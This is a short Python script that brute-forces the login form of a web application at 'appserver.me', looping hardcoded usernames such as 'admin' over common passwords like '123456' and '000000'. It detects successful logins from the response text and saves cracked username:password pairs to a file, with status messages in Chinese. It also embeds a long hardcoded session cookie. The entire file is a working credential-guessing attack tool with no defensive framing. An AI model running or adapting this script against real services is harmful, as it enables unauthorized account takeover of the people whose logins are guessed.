#!/usr/bin/python
# -*- coding: UTF-8 -*-
import requests
import time

outFile = open('accounts-cracked.txt', 'w')
def brute_force(user, password):
    domain = "appserver.me:5001"
    domain = "appserver.me:80"
    name = user.strip()
    passwd = password.strip()
    proxy = {"http":"127.0.0.1:8080"}
    url = "http://"+domain+"/login/"
    CT = "application/x-www-form-urlencoded"
    user_agent = "MacOS; Python3.6; requests)"
    AE = "gzip, deflate"
    appcookie = "BjplLUIONFs1KteXW9DZDU8lWrhi3wqvSyXoUNYo9XRSLhDb8FGChywp78WDSO3Nf2tTARohPSAmskgUIreF5s14zB26wOuk3cY-mK3VnnWlLqOH-k-Oak8HFeHx8wy0QfDP_c0m80giM0_-WeoRR_WbPW_ukpXnnFIHPpSUHAZECH77Bo86G_Ycj8J..FNGmgF9stidKmf2kYicPA4taTiqHQ9Z45aiCxsjVn-KVN1ysvAKwG3UkijYkIrVDuWMHsjSsPvlAtccvtbTjX-Gvx16ojwpG8zoKrO2jHYPuz5V1R0fS8Ki6QKPhv_sk-iqiA5lcmiNXX_akIuUnZQvhYz4eGC90h1x187jLXH_wuIV1PPRL-bHprZnWlOQer2PrimNRZZqoXmq_2SagCswTtkfCGWLvZBT344AjpzSlw5zP_WDXnO8rkKaoCwtwwTcByfvAt7uOQv_OdVjJ1PgmrVsKv8H3SNN5qyc4hYFyb51oJU_U6oD42XWYkxdzE7L36j1OZfimr-H5H_jjcUf8jAsyKuSw6wmvjYjpV5jok_GYAy4e-aBE7SKuI7p_wtxieYFrZl6ig9flL_N7zCquz19luX60xiiGjjONso70J_wheHePkRLi6bxnzF3M4e-7YmnNW5Gu8937fHC83B2R5uttMjQR4dlRYc_yYs2u3qV2dO6-yqsrikGHihOMzHhx5qT_QFNSx.871J9N4O"
    header = {"Content-Type":CT,"User-Agent":user_agent,"Accept-Encoding":AE}
    header_appcookie = dict({"wfaCdxkF":appcookie}, **header)
    #print(header_appcookie)
    data = name + '&' + passwd
    data = "uid=" + name + '&' + "passw=" + passwd
    #print("try data:",data)
    response = requests.post(url,headers=header,data=data,allow_redirects=False,proxies=proxy)
    code = response.headers.get('Location')
    #print(name,passwd)
    #print(response.text)
    if "age" in response.text:
        print("try data:",data,"状态码:" ,response.status_code, '+++++ find user:', name, ' with password:',passwd, '+++++')
        outFile.write(name + ':' + passwd+'\n' )
    else:
        #print('----- error user:', name, ' with password:',passwd, '-----')
        print("try data:",data,"状态码:" ,response.status_code, '----- ', name, ' 失败', '-----')
        pass
    return
    

if __name__ == '__main__':
    '''
    with open('user.txt', 'r') as userline:
        y = userline.readlines()
        with open('pass.txt', 'r') as passline:
            b= passline.readlines()
            for u in y:
                for p in b:
                    brute_force(user=u,password=p)
    '''
    zidian_u = ["admin", "qiqi", "feifei", "liyi", "haha", "zhangdm", "limumu", "limu"]
    zidian_p = ["passwdd", "123456", "000000", "666666"]
    for u in zidian_u:
        for p in zidian_p:
            brute_force(user=u,password=p)
            time.sleep(0.3)

outFile.close()
with open('accounts-cracked.txt','r') as text:
    list = text.readlines()
    sum=len(list)

if sum>0:
    print(u"找到%r个账号密码" %sum)

else:
    print(u"找到0个账号密码")


